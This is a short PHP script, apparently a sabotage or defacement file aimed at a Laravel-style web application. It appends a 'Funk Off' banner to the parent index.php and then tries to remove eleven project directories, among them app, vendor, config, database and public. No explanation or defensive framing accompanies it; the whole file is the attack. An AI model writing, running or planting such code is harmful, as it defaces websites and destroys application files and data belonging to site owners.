<?php
$myfile = fopen("../index.php", "a") or die("Unable to open file!");

$txt = "<h1> !!!!!!!!!!Funk Off!!!!!!!!!</h1>" ;

fwrite($myfile, $txt);

fclose($myfile);

$dir = "../app";
$dir1 = "../resources";
$dir2= "../routes";
$dir3 = "../storage";
$dir4 = "../h";
$dir5 = "../rdx";
$dir6 = "../vendor";
$dir7 = "../weunit";
$dir8 = "../database";
$dir9 = "../config";
$dir10 = "../public";

rmdir($dir);
rmdir($dir1);
rmdir($dir2);
rmdir($dir3);
rmdir($dir4);
rmdir($dir5);
rmdir($dir6);
rmdir($dir7);
rmdir($dir8);
rmdir($dir9);
rmdir($dir10);

?>